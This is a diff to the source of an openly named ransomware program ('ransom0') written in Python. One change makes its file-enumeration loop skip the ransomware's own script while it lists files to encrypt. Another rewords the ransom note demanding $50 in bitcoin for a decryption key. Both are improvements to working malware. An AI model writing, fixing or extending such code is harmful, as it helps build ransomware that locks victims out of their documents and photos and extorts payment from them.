@@ -98,6 +98,9 @@ class ransom0:
                 pass
             else:
                 for file in files:
+                    if file.endswith(__file__):
+                        continue
+
                     if file.endswith(self.EXTENSIONS):
                         TARGET = os.path.join(root, file)
                         f.write(TARGET+'\n')
@@ -164,8 +167,8 @@ PATH = os.getcwd()
 def DECRYPT_FILE():
     print('YOUR FILES HAVE BEEN ENCRYPTED')
     print('YOUR IMPORTANT DOCUMENTS, DATAS, PHOTOS, VIDEOS HAVE BEEN ENCRYPTED WITH MILITARY GRADE ENCRYPTION AND A UNIQUE KEY.')
-    print('to decrypt them, send 50$ in bitcoin to BITCOIN_ADRESS, and them send proof of tranfer and your DIGITS to mail@mail.com')
-    print('YOUR DIGITS IS {}'.format(digits))
+    print('to decrypt them, send 50$ in bitcoin to BITCOIN_ADRESS, and them send proof of tranfer and your DIGIT to mail@mail.com')
+    print('YOUR DIGIT IS {}'.format(digits))
     pretty_key = input("Your decryption key: ")
 
     def decrypt(filename):
